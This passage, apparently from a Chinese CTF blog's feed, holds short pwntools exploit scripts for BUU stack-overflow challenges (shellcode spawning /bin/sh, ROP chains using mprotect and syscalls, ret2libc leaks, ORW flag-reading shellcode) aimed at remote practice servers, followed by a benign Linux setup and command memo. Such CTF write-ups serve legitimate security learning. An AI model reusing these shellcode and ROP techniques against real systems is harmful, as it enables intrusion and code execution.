class="number">0x17</span>+p32(sys)+p32(<span class="number">0x8048677</span>)+p32(cat)</span><br><span class="line">print(pld)</span><br><span class="line">s(pld)</span><br><span class="line">ru(<span class="string">"&gt;"</span>)</span><br><span class="line">itr()</span><br></pre></td></tr></table></figure><h2 id="bjdctf-2020-router"><a href="#bjdctf-2020-router" class="headerlink" title="bjdctf_2020_router"></a>bjdctf_2020_router</h2><p>命令执行</p><h2 id="picoctf-2018-buffer-overflow-1"><a href="#picoctf-2018-buffer-overflow-1" class="headerlink" title="picoctf_2018_buffer overflow 1"></a>picoctf_2018_buffer overflow 1</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">p = remote(<span class="string">"node3.buuoj.cn"</span>,<span class="number">29603</span>)</span><br><span class="line">shellcode = <span class="string">"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"</span></span><br><span class="line">pld = shellcode.ljust(<span class="number">0x28</span>+<span class="number">4</span>,<span class="string">'A'</span>)+p32(<span class="number">0x080485CB</span>)</span><br><span class="line">sl(pld)</span><br><span class="line">itr()</span><br></pre></td></tr></table></figure><h2 id="ZJCTF-2019-Login"><a href="#ZJCTF-2019-Login" class="headerlink" title="[ZJCTF 2019]Login"></a>[ZJCTF 2019]Login</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#p = process("./pwn3.18")</span></span><br><span class="line">p = remote(<span class="string">"node3.buuoj.cn"</span>,<span class="number">25296</span>)</span><br><span class="line">ru(<span class="string">"Please enter username: "</span>)</span><br><span class="line">sl(<span class="string">"admin"</span>)</span><br><span class="line">ru(<span class="string">"Please enter password: "</span>)</span><br><span class="line">sl(<span class="string">b'2jctf_pa5sw0rd'</span>.ljust(<span class="number">0x48</span>, <span class="string">b'\x00'</span>) + p64(<span class="number">0x400e88</span>))</span><br><span class="line">itr()</span><br></pre></td></tr></table></figure><h2 id="cmcc-simplerop"><a href="#cmcc-simplerop" class="headerlink" title="cmcc_simplerop"></a>cmcc_simplerop</h2><p>1.写入bss段，32位系统调用</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#p = process("./pwn3.19")</span></span><br><span class="line">p = remote(<span class="string">"node3.buuoj.cn"</span>,<span class="number">26841</span>)</span><br><span class="line">elf = ELF(<span class="string">"./pwn3.19"</span>)</span><br><span class="line">int = <span class="number">0x080493e1</span></span><br><span class="line">pop_eax = <span class="number">0x080bae06</span></span><br><span class="line">pop_ebx = <span class="number">0x080481c9</span></span><br><span class="line">pop_ecx_ebx = <span class="number">0x0806e851</span></span><br><span class="line">pop_edx = <span class="number">0x0806e82a</span></span><br><span class="line">pop_edx_ecx_ebx = <span class="number">0x0806e850</span></span><br><span class="line">read = elf.sym[<span class="string">"read"</span>]</span><br><span class="line">bss = elf.bss()</span><br><span class="line">pld = <span class="string">b'A'</span>*(<span class="number">0x20</span>)+p32(read)+p32(pop_edx_ecx_ebx)+p32(<span class="number">0</span>)+p32(bss)+p32(<span class="number">8</span>)</span><br><span class="line">pld += p32(pop_eax)+p32(<span class="number">0xb</span>)+p32(pop_edx_ecx_ebx)+p32(<span class="number">0</span>)+p32(<span class="number">0</span>)+p32(bss)+p32(int)</span><br><span class="line">ru(<span class="string">"Your input :"</span>)</span><br><span class="line">sl(pld)</span><br><span class="line">s(<span class="string">"/bin/sh\x00"</span>)</span><br><span class="line">itr()</span><br></pre></td></tr></table></figure><p>2.改mprotect权限</p><blockquote><p><strong>mprotect()</strong>函数把自start开始的、长度为len的内存区的保护属性修改为prot指定的值</p><p>一般用于在利用shellcode方式进行栈溢出时，但是bss段没有足够的权限来写入shellcode时，可以利于mprotect函数来改写bss段的权限</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">p = remote(<span class="string">"node3.buuoj.cn"</span>,<span class="number">29587</span>)</span><br><span class="line">elf = ELF(<span class="string">"./pwn3.19"</span>)</span><br><span class="line">int = <span class="number">0x080493e1</span></span><br><span class="line">pop_eax = <span class="number">0x080bae06</span></span><br><span class="line">pop_ebx = <span class="number">0x080481c9</span></span><br><span class="line">pop_ecx_ebx = <span class="number">0x0806e851</span></span><br><span class="line">mprotect = elf.sym[<span class="string">"mprotect"</span>]</span><br><span class="line">pop_edx_ecx_ebx = <span class="number">0x0806e850</span></span><br><span class="line">read = elf.sym[<span class="string">"read"</span>]</span><br><span class="line">bss = elf.bss()</span><br><span class="line">print(hex(bss))</span><br><span class="line">pld = <span class="string">b'A'</span>*(<span class="number">0x20</span>)+p32(mprotect)+p32(pop_edx_ecx_ebx)+p32(<span class="number">0x80ea000</span>)+p32(<span class="number">0x2000</span>)+p32(<span class="number">7</span>)</span><br><span class="line">pld += p32(read)+p32(bss+<span class="number">0x50</span>)+p32(<span class="number">0</span>)+p32(bss+<span class="number">0x50</span>)+p32(<span class="number">0x50</span>)</span><br><span class="line">ru(<span class="string">"Your input :"</span>)</span><br><span class="line">sl(pld)</span><br><span class="line">sleep(<span class="number">2</span>)</span><br><span class="line">s(<span class="string">"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"</span>)</span><br><span class="line">itr()</span><br></pre></td></tr></table></figure><h2 id="jarvisoj-level1"><a href="#jarvisoj-level1" class="headerlink" title="jarvisoj_level1"></a>jarvisoj_level1</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">p = remote(<span class="string">"node3.buuoj.cn"</span>,<span class="number">27709</span>)</span><br><span class="line">write_plt=elf.plt[<span class="string">'write'</span>]</span><br><span class="line">write_got=elf.got[<span class="string">'write'</span>]</span><br><span class="line">main_addr=elf.symbols[<span class="string">'main'</span>]</span><br><span class="line">pld1=<span class="string">'A'</span>*<span class="number">140</span>+p32(write_plt)+p32(main_addr)+p32(<span class="number">1</span>)+p32(write_got)+p32(<span class="number">4</span>)</span><br><span class="line">sl(pld1)</span><br><span class="line"></span><br><span class="line">write_addr = uu32(p.recv(<span class="number">4</span>))</span><br><span class="line">libc=LibcSearcher(<span class="string">'write'</span>,write_addr)</span><br><span class="line">libcbase=write_addr-libc.dump(<span class="string">"write"</span>)</span><br><span class="line">system=libcbase+libc.dump(<span class="string">"system"</span>)</span><br><span class="line">binsh=libcbase+libc.dump(<span class="string">"str_bin_sh"</span>)</span><br><span class="line">leak(<span class="string">"libc"</span>,libcbase)</span><br><span class="line">pld=<span class="string">'A'</span>*<span class="number">140</span>+p32(system)+p32(<span class="number">0</span>)+p32(binsh)</span><br><span class="line">sl(pld)</span><br><span class="line">itr()</span><br></pre></td></tr></table></figure><h2 id="pwnable-orw"><a href="#pwnable-orw" class="headerlink" title="pwnable_orw"></a>pwnable_orw</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">p &#x3D; remote(&quot;node3.buuoj.cn&quot;,26963)</span><br><span class="line">shellcode&#x3D;asm(&#39;push 0x0;push 0x67616c66;mov ebx,esp;xor ecx,ecx;xor edx,edx;mov eax,0x5;int 0x80&#39;)</span><br><span class="line">shellcode+&#x3D;asm(&#39;mov eax,0x3;mov ecx,ebx;mov ebx,0x3;mov edx,0x100;int 0x80&#39;)</span><br><span class="line">shellcode+&#x3D;asm(&#39;mov eax,0x4;mov ebx,0x1;int 0x80&#39;)</span><br><span class="line">sl(shellcode)</span><br><span class="line">itr()</span><br></pre></td></tr></table></figure><h2 id="wustctf2020-getshell"><a href="#wustctf2020-getshell" class="headerlink" title="wustctf2020_getshell"></a>wustctf2020_getshell</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">p &#x3D; remote(&quot;node3.buuoj.cn&quot;,29511)</span><br><span class="line">pld &#x3D; b&#39;A&#39;*(0x18+0x4)+p32(0x0804851B)</span><br><span class="line">sl(pld)</span><br><span class="line">itr()</span><br></pre></td></tr></table></figure><h2 id="picoctf-2018-buffer-overflow-2"><a href="#picoctf-2018-buffer-overflow-2" class="headerlink" title="picoctf_2018_buffer overflow 2"></a>picoctf_2018_buffer overflow 2</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">p &#x3D; remote(&quot;node3.buuoj.cn&quot;,27988)</span><br><span class="line">#p &#x3D; process(&quot;.&#x2F;pwn3.24&quot;)</span><br><span class="line">#p &#x3D; process(&quot;.&#x2F;pwn3.23&quot;,env &#x3D;&#123;&quot;LD_PRELOAD&quot;:&quot;.&#x2F;libc-2.232.so&quot;&#125;)</span><br><span class="line">pld &#x3D; b&#39;A&#39;*(0x6c+0x4)+p32(0x080485CB)+p32(0)+p32(0xDEADBEEF)+p32(0xDEADC0DE)</span><br><span class="line">sl(pld)</span><br><span class="line">#gdb.attach(p)</span><br><span class="line">itr()</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;寒假开始刷题&lt;/p&gt;
&lt;h1 id=&quot;BUU（栈）&quot;&gt;&lt;a href=&quot;#BUU（栈）&quot; class=&quot;headerlink&quot; title=&quot;BUU（栈）&quot;&gt;&lt;/a&gt;BUU（栈）&lt;/h1&gt;&lt;h2 id=&quot;warmup-csaw-2016&quot;&gt;&lt;a href=&quot;#warmup-</summary>
      
    
    
    
    
    <category term="BUU" scheme="https://pz1o.top/tags/BUU/"/>
    
  </entry>
  
  <entry>
    <title>Linux备忘录</title>
    <link href="https://pz1o.top/2021/01/23/linux%E5%A4%87%E5%BF%98%E5%BD%95/"/>
    <id>https://pz1o.top/2021/01/23/linux%E5%A4%87%E5%BF%98%E5%BD%95/</id>
    <published>2021-01-23T06:22:17.000Z</published>
    <updated>2021-03-29T10:14:09.420Z</updated>
    
    <content type="html"><![CDATA[<p>主要记录一些基础的linux知识</p><h1 id="0x01-安装PWN环境"><a href="#0x01-安装PWN环境" class="headerlink" title="0x01 安装PWN环境"></a>0x01 安装PWN环境</h1><p>这里主要记录一下从0开始安装pwn环境</p><h2 id="1-vmtools"><a href="#1-vmtools" class="headerlink" title="1.vmtools"></a>1.vmtools</h2><p>先挂载上</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">tar zxpf VMwareTools-x.x.x-yyyy.tar.gz</span><br><span class="line">cd vmware-tools-distrib</span><br><span class="line">sudo .&#x2F;vmware-install.pl</span><br></pre></td></tr></table></figure><p>安装先输YES</p><p>之后直接回车</p><h2 id="2-安装git"><a href="#2-安装git" class="headerlink" title="2.安装git"></a>2.安装git</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install git</span><br></pre></td></tr></table></figure><h2 id="3-安装pip"><a href="#3-安装pip" class="headerlink" title="3.安装pip"></a>3.安装pip</h2><p>pip2</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install python-pip</span><br></pre></td></tr></table></figure><p>pip3</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install python3-pip</span><br></pre></td></tr></table></figure><h2 id="4-安装vim"><a href="#4-安装vim" class="headerlink" title="4.安装vim"></a>4.安装vim</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get remove vim-common</span><br><span class="line">sudo apt-get install vim</span><br></pre></td></tr></table></figure><h2 id="5-安装pwntools"><a href="#5-安装pwntools" class="headerlink" title="5.安装pwntools"></a>5.安装pwntools</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install pwntools</span><br></pre></td></tr></table></figure><h2 id="6-安装libcSearcher"><a href="#6-安装libcSearcher" class="headerlink" title="6.安装libcSearcher"></a>6.安装libcSearcher</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">git clone https:&#x2F;&#x2F;github.com&#x2F;lieanu&#x2F;LibcSearcher.git</span><br><span class="line">cd LibcSearcher</span><br><span class="line">sudo python setup.py install</span><br><span class="line">把LibcSearcher.py放在exp相同目录下运行exp.py即可</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">先安装libc库</span><br><span class="line">exp片段：</span><br><span class="line">from LibcSearcher import *</span><br><span class="line">elf&#x3D;ELF(&#39;libc.xx.xx&#39;)</span><br><span class="line">libc &#x3D; LibcSearcher(&#39;write&#39;,write_addr)</span><br><span class="line">offset &#x3D; write_addr - libc.dump(&#39;write&#39;)</span><br><span class="line">sys_addr &#x3D; offset + libc.dump(&#39;system&#39;)</span><br></pre></td></tr></table></figure><h2 id="7-安装One-gadget"><a href="#7-安装One-gadget" class="headerlink" title="7.安装One_gadget"></a>7.安装One_gadget</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install ruby</span><br><span class="line">sudo gem install one_gadget</span><br></pre></td></tr></table></figure><h2 id="8-安装pwndbg"><a href="#8-安装pwndbg" class="headerlink" title="8.安装pwndbg"></a>8.安装pwndbg</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git clone https:&#x2F;&#x2F;github.com&#x2F;pwndbg&#x2F;pwndbg</span><br><span class="line">cd pwndbg</span><br><span class="line">.&#x2F;setup.sh</span><br></pre></td></tr></table></figure><h2 id="9-安装ssh"><a href="#9-安装ssh" class="headerlink" title="9.安装ssh"></a>9.安装ssh</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install openssh-server</span><br><span class="line">&#x2F;&#x2F;开启服务</span><br><span class="line">sudo service ssh start</span><br></pre></td></tr></table></figure><p><strong>配置文件/etc/ssh/sshd_config</strong></p><h2 id="10-安装conda"><a href="#10-安装conda" class="headerlink" title="10.安装conda"></a>10.安装conda</h2><p>conda是一个开源的软件包管理系统和环境管理系统，用于安装多个版本的软件包及其依赖关系，并在它们之间轻松切换。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">wget -c https:&#x2F;&#x2F;repo.continuum.io&#x2F;miniconda&#x2F;Miniconda3-latest-Linux-x86_64.sh</span><br><span class="line"></span><br><span class="line">chmod 777 Miniconda3-latest-Linux-x86_64.sh</span><br><span class="line">sh Miniconda3-latest-Linux-x86_64.sh</span><br><span class="line"> </span><br><span class="line">&#x2F;&#x2F;配置源</span><br><span class="line">conda config --add channels https:&#x2F;&#x2F;mirrors.tuna.tsinghua.edu.cn&#x2F;anaconda&#x2F;pkgs&#x2F;free&#x2F;</span><br><span class="line">conda config --add channels https:&#x2F;&#x2F;mirrors.tuna.tsinghua.edu.cn&#x2F;anaconda&#x2F;pkgs&#x2F;main&#x2F;</span><br><span class="line">conda config --add channels https:&#x2F;&#x2F;mirrors.tuna.tsinghua.edu.cn&#x2F;anaconda&#x2F;cloud&#x2F;conda-forge&#x2F;</span><br><span class="line">conda config --add channels https:&#x2F;&#x2F;mirrors.tuna.tsinghua.edu.cn&#x2F;anaconda&#x2F;cloud&#x2F;bioconda&#x2F;</span><br><span class="line">conda config --set show_channel_urls yes </span><br><span class="line">conda config --get channels</span><br><span class="line">&#x2F;&#x2F;删除配置源</span><br><span class="line">conda config --remove-key channels</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;环境命令</span><br><span class="line">conda env list</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;创建环境</span><br><span class="line">conda create -n 3.6.7 python&#x3D;3.6.7</span><br><span class="line">&#x2F;&#x2F;切换环境</span><br><span class="line">conda activate</span><br><span class="line">&#x2F;&#x2F;退出环境</span><br><span class="line">conda deactivate</span><br><span class="line">&#x2F;&#x2F;移除环境</span><br><span class="line">conda remove -n env_name --all</span><br></pre></td></tr></table></figure><h1 id="0x02-一些命令"><a href="#0x02-一些命令" class="headerlink" title="0x02 一些命令"></a>0x02 一些命令</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">top 实时查看系统运行情况</span><br><span class="line"></span><br><span class="line">var&#x3D;value 给var赋值</span><br><span class="line">$var,$&#123;var&#125;  取变量的值</span><br><span class="line">&#96;cmd&#96; $(cmd) 代换标准输出</span><br><span class="line">&#39;$var&#39;      非替换字符串  $var</span><br><span class="line">&quot;$var&quot;可替换字符串1</span><br><span class="line"></span><br><span class="line">env  &#x2F;&#x2F;所有环境变量</span><br><span class="line">LD_PRELOAD&#x3D;xx.so ldd a  &#x2F;&#x2F;优先加载动态链接库</span><br></pre></td></tr></table></figure><h2 id="netstat"><a href="#netstat" class="headerlink" title="netstat"></a>netstat</h2><p>netstat是win中的一个命令，它用于查看本机端口状态。、</p><p>常用参数有-a -n -b（显示连接程序）</p><p><strong>linux中netstat</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">netstat</span><br><span class="line">-a : 将目前系统上所有的连接、监听、socket信息都列出来</span><br><span class="line">-t ：列出tcp网络封包的信息</span><br><span class="line">-u ：列出udp网络封包的信息</span><br><span class="line">-n ：不以进程的服务名称，以端口号来显示</span><br><span class="line">-l ：列出目前正在网络监听的服务</span><br><span class="line">-p ：列出该网络服务的进程PID</span><br><span class="line"></span><br><span class="line">#常用的参数</span><br><span class="line">netstat -anp | grep 端口号  &#x2F;&#x2F;筛选出端口号</span><br><span class="line">netstat -aultp  &#x2F;&#x2F;查看哪些端口被占用</span><br></pre></td></tr></table></figure><p><img src="/2021/01/23/linux%E5%A4%87%E5%BF%98%E5%BD%95/image-20200926113121287.png" alt="image-20200926113121287"></p><h2 id="curl用法"><a href="#curl用法" class="headerlink" title="curl用法"></a>curl用法</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">#查看网页源码</span><br><span class="line">curl www.baidu.com</span><br><span class="line"></span><br><span class="line">#显示头信息</span><br><span class="line">curl -i www.baidu.com &#x2F;&#x2F;头和页面一起显示</span><br><span class="line">curl -I www.baidu.com  &#x2F;&#x2F;只显示头</span><br><span class="line"></span><br><span class="line">#显示通信过程</span><br><span class="line">curl -v www.baidu.com</span><br><span class="line"></span><br><span class="line">#发送表单信息</span><br><span class="line">#get请求</span><br><span class="line">curl http:&#x2F;&#x2F;httpbin.org&#x2F;get?id&#x3D;1</span><br><span class="line">#post请求</span><br><span class="line">curl -X POST --data &quot;name&#x3D;value&quot; http:&#x2F;&#x2F;httpbin.org&#x2F;post</span><br><span class="line">curl -X POST --data-urlencode &quot;date&#x3D;April 1&quot; http:&#x2F;&#x2F;httpbin.org&#x2F;post</span><br><span class="line"></span><br><span class="line">#http动词</span><br><span class="line">curl -X POST www.baidu.com</span><br><span class="line"></span><br><span class="line">#文件上传</span><br><span class="line">表单这样的话</span><br><span class="line">&lt;form method&#x3D;&quot;POST&quot; enctype&#x3D;&#39;multipart&#x2F;form-data&#39; action&#x3D;&quot;upload.cgi&quot;&gt;</span><br><span class="line">　　　　&lt;input type&#x3D;file name&#x3D;upload&gt;</span><br><span class="line">　　　　&lt;input type&#x3D;submit name&#x3D;press value&#x3D;&quot;OK&quot;&gt;</span><br><span class="line">&lt;&#x2F;form&gt;</span><br><span class="line">可以用curl</span><br><span class="line">curl --form upload&#x3D;xxx --form press&#x3D;xxx [URL]</span><br><span class="line"></span><br><span class="line">#Referer字段</span><br><span class="line">curl --referer http:&#x2F;&#x2F;www.baidu.com http:&#x2F;&#x2F;www.baidu.com</span><br><span class="line"></span><br><span class="line">#User agent</span><br><span class="line">curl --user-agent &#39;[User Agent]&#39; [URL]</span><br><span class="line"></span><br><span class="line">#cookie</span><br><span class="line">curl --cookir &quot;id&#x3D;xxx&quot; www.baidu.com</span><br><span class="line"></span><br><span class="line">#增加头信息</span><br><span class="line">curl --header &quot;Content-Type:application&#x2F;json&quot; www.baidu.com</span><br></pre></td></tr></table></figure><h2 id="wget"><a href="#wget" class="headerlink" title="wget"></a>wget</h2><p>Linux系统中的wget是一个下载文件的工具，它用在命令行下。对于Linux用户是必不可少的工具，我们经常要下载一些软件或从远程服务器恢复备份到本地服务器。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;使用wget下载单个文件</span><br><span class="line">wget http:&#x2F;&#x2F;www.minjieren.com&#x2F;wordpress-3.1-zh_CN.zip</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;使用wget -O下载并以不同的文件名保存</span><br><span class="line">wget -O wordpress.zip http:&#x2F;&#x2F;www.minjieren.com&#x2F;download.aspx?id&#x3D;1080</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;使用wget –limit -rate限速下载</span><br><span class="line">wget --limit-rate&#x3D;300k http:&#x2F;&#x2F;www.minjieren.com&#x2F;wordpress-3.1-zh_CN.zip</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;伪装代理名称下载</span><br><span class="line">wget --user-agent&#x3D;“Mozilla&#x2F;5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit&#x2F;534.16 (KHTML, like Gecko) Chrome&#x2F;10.0.648.204 Safari&#x2F;534.16” http:&#x2F;&#x2F;www.minjieren.com&#x2F;wordpress-3.1-zh_CN.zip</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;使用wget –spider测试下载链接</span><br><span class="line">wget --spider URL</span><br><span class="line">正确会返回200，错误返回404</span><br></pre></td></tr></table></figure><h2 id="tar"><a href="#tar" class="headerlink" title="tar"></a>tar</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">tar -xzvf  *.tar.gz</span><br><span class="line">      tar [-cxtzjvfpPN] 文件与目录 ....</span><br><span class="line">      参数：</span><br><span class="line">      -c ：建立一个压缩文件的参数指令(create 的意思)；</span><br><span class="line">      -x ：解开一个压缩文件的参数指令！</span><br><span class="line">      -t ：查看 tarfile 里面的文件！</span><br><span class="line">      特别注意，在参数的下达中， c&#x2F;x&#x2F;t 仅能存在一个！不可同时存在！</span><br><span class="line">      因为不可能同时压缩与解压缩。</span><br><span class="line">      -z ：是否同时具有 gzip 的属性？亦即是否需要用 gzip 压缩？</span><br><span class="line">      -j ：是否同时具有 bzip2 的属性？亦即是否需要用 bzip2 压缩？</span><br><span class="line">      -v ：压缩的过程中显示文件！这个常用，但不建议用在背景执行过程！</span><br><span class="line">      -f ：使用档名，请留意，在 f 之后要立即接档名喔！不要再加参数！</span><br></pre></td></tr></table></figure><h2 id="nslookup"><a href="#nslookup" class="headerlink" title="nslookup"></a>nslookup</h2><p>nslookup用于查询DNS的记录，查询域名解析是否正常，在网络故障时用来诊断网络问题</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;直接查询</span><br><span class="line">nslookup www.baidu.com</span><br></pre></td></tr></table></figure><h2 id="find"><a href="#find" class="headerlink" title="find"></a>find</h2><p><a href="https://www.cnblogs.com/Ido-911/p/9638612.html" target="_blank" rel="noopener">https://www.cnblogs.com/Ido-911/p/9638612.html</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#根据文件名称查找文件</span></span><br><span class="line"><span class="comment">#查找文件</span></span><br><span class="line">find test.c  //感觉不太常用</span><br><span class="line"><span class="comment">#从主目录下查找test文件</span></span><br><span class="line">find / -name <span class="built_in">test</span></span><br><span class="line"><span 